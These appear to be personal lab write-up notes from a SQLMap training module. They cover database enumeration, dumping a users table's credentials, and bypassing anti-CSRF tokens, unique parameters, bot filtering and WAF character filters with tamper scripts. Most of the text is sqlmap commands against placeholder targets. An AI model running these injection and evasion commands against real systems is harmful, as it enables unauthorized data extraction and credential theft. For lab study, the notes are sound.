# SQLMap – Advanced Database Enumeration

## Objective

Practice advanced SQL injection enumeration techniques with SQLMap and retrieve specific information from a vulnerable database.

---

## Case #1 – Finding a Column Containing "style"

### Goal

Identify the name of the column containing the word **"style"**.

### Initial Approach

I first attempted to enumerate the whole database schema:

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

Although this provided all databases, tables, and columns, the amount of information made it difficult to manually locate the desired column.

### Optimized Approach

Instead of searching manually, I used SQLMap's search feature to look for columns containing the keyword `style`:

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C style --batch
```

### Result

SQLMap returned the column:

```
PARAMETER_STYLE
```

This solved the first challenge efficiently without having to inspect the entire schema manually.

---

## Case #2 – Retrieving Kimberly's Password

### Goal

Find the password associated with the user **Kimberly**.

### Step 1 – Identify the Database and Table

Since HTB labs commonly use the `testdb` database and a `users` table, I started by enumerating the table columns:

```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch
```

This revealed the relevant columns:

* `name`
* `password`

### Step 2 – Dump Only the Required Data

To avoid unnecessary output, I dumped only the `name` and `password` columns:

```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump -C name,password --batch
```

### Result

The output contained the credentials of all users, allowing me to identify Kimberly's password.

---

## Key Takeaways

* `--schema` provides a complete overview of the database structure, but can generate excessive output.
* `--search` is useful for quickly locating databases, tables, or columns based on keywords.
* `--columns` allows targeted enumeration of table structures.
* `--dump -C` makes data extraction more efficient by retrieving only specific columns.
* Limiting enumeration to the necessary information reduces noise and speeds up the process.

## Commands Used

```bash
# Enumerate schema
sqlmap -u "http://www.example.com/?id=1" --schema

# Search for columns containing "style"
sqlmap -u "http://www.example.com/?id=1" --search -C style --batch

# Enumerate columns in users table
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch

# Dump only name and password columns
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump -C name,password --batch
```

## Skills Practiced

* SQL Injection Enumeration
* Database Schema Discovery
* Targeted Data Extraction
* SQLMap Automation
* Information Gathering
* Efficient Enumeration Techniques

# SQLMap – Web Application Protection Bypass & Advanced Exploitation (2026-06-21)

## Objective

Practice exploiting SQL injection vulnerabilities protected by common web application defenses and learn how to adapt SQLMap to bypass anti-CSRF mechanisms, dynamic parameters, request filtering, and WAF protections.

---

## Case #8 – Bypassing Anti-CSRF Protection

### Goal

Exploit a SQL injection vulnerability in the POST parameter `id` while handling a non-standard anti-CSRF token.

### Initial Understanding

The application required a token parameter that changed with every request:

```text
id=1&t0ken=<value>
```

The challenge was understanding that the `--csrf-token` option expects the **parameter name**, not the token value.

### Approach

I supplied both the POST data and the token parameter name:

```bash
sqlmap -u "http://target/case8.php" \
--data="id=1&t0ken=<token_value>" \
--csrf-token=t0ken \
--batch
```

### Result

SQLMap automatically refreshed the token and successfully exploited the injection, allowing database enumeration and data extraction.

---

## Case #9 – Bypassing Unique Parameter Validation

### Goal

Exploit a SQL injection vulnerability in the GET parameter `id` while handling a unique `uid` parameter.

### Understanding the Protection

The application required a different `uid` value for every request:

```text
http://target/case9.php?id=1&uid=1653141373
```

Using the same value repeatedly caused requests to fail.

### Approach

I used SQLMap's randomization feature:

```bash
sqlmap -u "http://target/case9.php?id=1&uid=1653141373" \
--randomize=uid \
--batch
```

### Result

SQLMap generated a new value for `uid` before every request, allowing successful exploitation and database enumeration.

---

## Case #10 – Request Filtering and Bot Detection

### Goal

Understand why SQLMap failed to detect the vulnerability and bypass the protection mechanism.

### Initial Attempt

I started with:

```bash
sqlmap -u "http://target/case10.php" --data="id=1" --batch
```

SQLMap reported:

- No stable page content.
- Parameter not dynamic.
- No injectable parameters found.

### Investigation

The output suggested that the application was blocking automated requests rather than preventing SQL injection itself.

### Bypass

I used a randomized User-Agent to imitate legitimate browser traffic:

```bash
sqlmap -u "http://target/case10.php" \
--data="id=1" \
--random-agent \
--batch
```

### Result

The protection was bypassed and SQLMap was able to proceed with exploitation.

---

## Case #11 – Character Filtering (`<`, `>`)

### Goal

Exploit SQL injection while bypassing filters blocking comparison operators.

### Understanding the Protection

The application filtered characters such as:

```text
<
>
```

This prevented certain SQLMap payloads from functioning.

### Approach

I used the `between` tamper script:

```bash
sqlmap -u "http://target/case11.php?id=1" \
--tamper=between \
--batch
```

### Result

The tamper script rewrote comparison operations using equivalent SQL expressions, bypassing the filter and allowing successful exploitation.

---

## Protection Mechanisms Studied

### Anti-CSRF Tokens

Learned how SQLMap automatically updates token values:

```bash
--csrf-token=<parameter_name>
```

---

### Unique Parameters

Learned how to generate random values for parameters that must be unique:

```bash
--randomize=<parameter_name>
```

---

### Calculated Parameters

Studied the use of:

```bash
--eval
```

to dynamically calculate parameter values before each request.

Example:

```python
import hashlib
h = hashlib.md5(id).hexdigest()
```

---

### Tamper Scripts

Learned how tamper scripts modify payloads to bypass filters and WAF protections.

Examples:

| Tamper Script | Purpose |
|----------------|---------|
| between | Replace `<`, `>`, and `=` operations |
| randomcase | Randomize keyword capitalization |
| space2comment | Replace spaces with comments |
| space2dash | Replace spaces with dash comments |
| equaltolike | Replace `=` with `LIKE` |
| versionedkeywords | Hide keywords inside MySQL comments |

---

## Key Takeaways

* Anti-CSRF protection can be bypassed using `--csrf-token`.
* Parameters requiring unique values can be handled with `--randomize`.
* Calculated parameters can be generated dynamically with `--eval`.
* Request failures do not always mean the target is not vulnerable; protections may simply be blocking automated traffic.
* `--random-agent` helps bypass basic bot detection.
* Tamper scripts allow SQLMap to evade simple filters and WAF rules.
* Understanding the protection mechanism is often more important than memorizing commands.
* Troubleshooting SQLMap output is an essential part of exploitation.

---

## Commands Used

```bash
# Anti-CSRF token bypass
sqlmap -u "http://target/case8.php" \
--data="id=1&t0ken=<value>" \
--csrf-token=t0ken \
--batch

# Unique parameter bypass
sqlmap -u "http://target/case9.php?id=1&uid=<value>" \
--randomize=uid \
--batch

# Request filtering bypass
sqlmap -u "http://target/case10.php" \
--data="id=1" \
--random-agent \
--batch

# Character filtering bypass
sqlmap -u "http://target/case11.php?id=1" \
--tamper=between \
--batch
```

## Skills Practiced

* SQL Injection Exploitation
* SQLMap Automation
* Anti-CSRF Token Handling
* Dynamic Parameter Randomization
* Request Filtering Bypass
* WAF Evasion Techniques
* Tamper Script Usage
* Troubleshooting SQLMap Output
* Web Application Protection Analysis
* Advanced Enumeration Techniques


012745
